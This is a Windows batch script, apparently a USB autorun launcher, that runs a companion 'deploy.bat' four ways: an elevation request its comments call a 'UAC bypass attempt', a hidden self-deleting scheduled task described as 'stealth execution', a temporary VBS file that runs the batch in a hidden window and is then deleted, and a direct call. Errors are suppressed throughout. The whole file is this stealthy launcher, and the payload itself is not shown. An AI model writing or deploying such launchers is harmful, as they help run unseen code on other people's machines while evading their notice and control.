@echo off
:: Advanced Autorun Deployment Script
:: Multiple execution methods for maximum compatibility

:: Method 1: Direct execution with UAC bypass attempt
powershell -Command "Start-Process 'deploy.bat' -Verb RunAs" 2>NUL

:: Method 2: Scheduled task creation for stealth execution  
powershell -Command "
$action = New-ScheduledTaskAction -Execute 'cmd' -Argument '/c \"%~dp0deploy.bat\"'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
$settings = New-ScheduledTaskSettingsSet -Hidden -DeleteExpiredTaskAfter 00:00:01
Register-ScheduledTask -TaskName 'USBAutoInstall' -Action $action -Trigger $trigger -Settings $settings -Force
" 2>NUL

:: Method 3: Background execution via WScript
echo CreateObject("WScript.Shell").Run "cmd /c \"%~dp0deploy.bat\"", 0, False > "%TEMP%\autorun.vbs"
cscript //nologo "%TEMP%\autorun.vbs" 2>NUL
del "%TEMP%\autorun.vbs" 2>NUL

:: Method 4: Direct call as fallback
call "%~dp0deploy.bat" 2>NUL

exit /b 0